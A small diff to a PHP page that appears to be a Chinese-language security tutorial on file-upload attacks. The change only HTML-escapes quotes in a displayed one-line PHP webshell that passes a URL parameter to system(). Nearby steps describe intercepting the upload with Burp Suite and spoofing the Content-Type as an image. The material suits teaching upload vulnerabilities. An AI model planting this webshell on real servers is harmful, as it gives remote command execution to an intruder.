@@ -88,7 +88,7 @@ $content = '<div class="card">
                         <li>准备一个PHP文件，例如：</li>
                         <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php
 // webshell.php
-system($_GET['cmd']);
+system($_GET[&#39;cmd&#39;]);
 ?&gt;</code></pre>
                         <li>使用Burp Suite拦截文件上传请求</li>
                         <li>修改Content-Type为图片类型，例如：</li>
